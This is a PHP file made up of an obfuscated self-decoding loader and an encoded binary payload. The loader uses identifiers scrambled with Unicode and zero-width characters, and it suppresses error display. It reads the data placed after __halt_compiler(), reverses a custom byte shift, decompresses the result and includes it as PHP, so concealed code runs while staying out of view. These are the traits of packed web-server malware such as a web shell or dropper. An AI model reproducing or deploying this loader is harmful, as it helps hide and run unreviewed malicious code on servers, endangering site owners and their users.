<?php class Ϭ‌Ӱ쁲y{private $Π﻿ワa;public function __construct($Π﻿ワa=10){@ini_set("display_errors",0);$this->Π﻿ワa=$Π﻿ワa;}private function し땻ゎ​Рo($d){$l=strlen($d);$r="";for($i=0;$i<$l;$i++){$b=(ord($d[$i])-($this->Π﻿ワa*($i+1)**2)-37+65536)%256;$r.=chr($b);}return $r;}public function 展鹦а퀷鏎t($file,$offset){$h=fopen($file,"rb");fseek($h,$offset);$c=stream_get_contents($h);fclose($h);$d=$this->し땻ゎ​Рo($c);$p=gzinflate($d);if($p===false)die("x");$t=tmpfile();fwrite($t,$p);fseek($t,0);include(stream_get_meta_data($t)["uri"]);fclose($t);}}function 獏尥냉o(){for($i=0;$i<3;$i++){$a=1+1;}}if(!headers_sent()&&php_sapi_name()!=="cli"){ob_start();}$loader=new Ϭ‌Ӱ쁲y();$loader->展鹦а퀷鏎t(__FILE__,__COMPILER_HALT_OFFSET__);__halt_compiler();�
�t��BH�qĂ����+�M4\*%E_�hD��J�
8���
��=&Qԫ@�x��ݮ~$ؿ-J>��t���vA�d�C9L�[<Σn��UmB�!$
�w�:6�.P��4$�|>/��	��>H""4��>�	�κ����.#���:�@�5
<�Ԯ�6�x��#��e��Z�뜾�X�U�����_̽#.kc$ΣD���^��F�0t�	M�f��M.n"�x�$���n��x��N�����F��-3��J�'��L�����~�x�X�A�vC*=<�|NLr=���K�nRX����D��D>�	�ʍ�:���~�/C;@b!��#v$v��V�Zs�L>����>���~�!�V:<�<p�}���~�k
